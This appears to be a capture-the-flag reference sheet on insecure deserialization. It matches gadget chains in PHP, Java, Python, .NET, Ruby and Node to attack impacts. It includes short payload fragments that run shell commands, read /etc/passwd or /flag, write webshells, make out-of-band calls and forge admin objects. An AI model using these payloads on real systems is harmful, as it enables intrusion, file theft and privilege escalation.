# Gadgets by Sink — pick the chain by the impact you want

## The matrix — impact → which gadget gets there

### Want: remote code execution (a shell command)

| Lang | Gadget | Mechanism |
|---|---|---|
| PHP | `Laravel/RCE*`, `Monolog/RCE*`, `Symfony/RCE*`, `Guzzle/RCE1` | call_user_func / eval via magic method |
| PHP | `assert()`/`preg_replace /e`/`create_function` inside a chain | eval-in-a-callable |
| Java | `CommonsCollections1-7`, `CommonsBeanutils1`, `Groovy1`, `Spring1/2`, `Jdk7u21` | `InvokerTransformer`/`Method.invoke`→`Runtime.exec` |
| Java | `Hibernate`, `Myfaces`, `Rome`, `Click`, `Vaadin`, `JSON1` | same InvokerTransformer family per lib |
| Python | `(os.system, ('cmd',))` / `(subprocess.check_output, ...)` / `(eval, ...)` | `REDUCE` on a callable |
| .NET | `TypeConfuseDelegate`, `ActivitySurrogateSelector`, `WindowsIdentity`, `TextFormattingRunProperties` | Process.Start / compile-to-assembly |
| .NET | `ObjectDataProvider` (Json.NET/Xaml) | named method on named object |
| Ruby | ERB-universal (ActiveSupport::Deprecation) | ERB#result eval |
| Node | `_$$ND_FUNC$$_...()` | child_process.exec |

### Want: arbitrary file write (webshell, config, SSH key)

| Lang | Gadget | Writes via |
|---|---|---|
| PHP | `Guzzle/FW1`, `SwiftMailer/FW*`, `Monolog/FW1`, `Symfony/FW*`, `Magento/FW*` | file_put_contents / stream write on destruct |
| PHP | phar:// + a custom POP | file op on metadata |
| Java | `AspectJWeaver`, `FileUpload1` | file write — webshell into webroot |
| Python | `(open, ('path','w'))` + a write via reduce-chain, or `(eval, ("open().write()",))` | file write |
| .NET | `ObjectDataProvider` with a file-writer class | named method |

### Want: file read / source disclosure

| Lang | Gadget | Reads via |
|---|---|---|
| PHP | `Monolog/FR1`, `ZendFramework/FR1` | file_get_contents → reflected |
| PHP | phar:// + a __toString file-read | file read on string use |
| Java | `Rome`/`Hibernate` getter-reflect, `AspectJWeaver`-style | reads a file into the object |
| Python | `(open, ('/etc/passwd','r'))` then reflected | file handle → string |
| .NET | `ObjectDataProvider` + a reader class | named method |

### Want: OOB confirm (no RCE needed)

| Lang | Gadget | Fetches |
|---|---|---|
| any | `nslookup`/`curl`/`dns resolve` in the payload | DNS/HTTP |
| PHP | `SoapClient` __call → WSDL fetch | remote WSDL |
| PHP | `Guzzle/SSRF1` | URL fetch |
| Java | `URLDNS` (JDK-only) | DNS resolve |
| Java | `JRMPClient` → your JRMPListener | TCP connect |
| Java | `C3P0`/`JdbcRowSetImpl` | JNDI LDAP/RMI |
| .NET | `ObjectDataProvider` + URL-fetch class | HTTP |
| Python | `(eval, ("__import__('urllib').urlopen(...)"))` | HTTP |
| Node | `require('dns').lookup`/`http.get` inside `$$ND_FUNC$$` | DNS/HTTP |

### Want: authentication bypass (no code — just props)

| Lang | Shape |
|---|---|
| PHP | `O:8:"User":{...is_admin:true...}` — a prop the app checks |
| Java | a serialized `Principal`/`User` with `role=admin` |
| Python | a session object with `is_admin`/`role` props |
| .NET | a `ClaimsPrincipal`/`WindowsIdentity` with admin claims |
| Ruby | a session/model object with `admin=true` |

### Want: JNDI injection (Java only)

| Gadget | Internal call |
|---|---|
| `JdbcRowSetImpl` | `setDataSourceName` → `getConnection` → `lookup` |
| `C3P0` | `PoolBackedDataSource` → `Referenceable` → `lookup` |
| `HikariCP` | `HikariJNDIFactory` → `lookup` |
| fastjson `@type` JdbcRowSetImpl | auto-type → `setDataSourceName` → `lookup` |

### Want: timing/oracle (weakest — last resort)

| Lang | Gadget |
|---|---|
| any | `sleep(N)`/`Thread.sleep(N)`/`time.sleep(N)` in the payload |
| Java | a chain whose sink blocks on a DNS/HTTP to a blackhole |
| PHP | `sleep(5)` inside a `call_user_func` chain |

## The pick logic

```
1. what does the challenge NEED?  → usually flag-in-response or RCE
2. what does the classpath allow? → the gadget whose lib is present
3. what's reachable?              → egress? filesystem? nothing?
4. pick the cheapest impact that still reaches the flag
```

**Rule:** a file-write that lands a readable flag-file beats an RCE that
fails on an egress-blocked box. The impact is a means — pick the cheapest
one the target permits.

## The "no RCE but a flag-read" short-circuit

```python
# instead of os.system — read the flag into the response:
(eval, ("open('/flag').read()",))
```

```php
// instead of system — a file-read chain reflects the flag in the body
O:... Monolog/FR1 reads /flag into the log → reflected
```

```java
// instead of Runtime.exec — a chain whose getter reads /flag
```

If the goal is "flag in response", a file-read gadget is strictly cheaper
than a shell — skip the shell entirely when a read suffices.
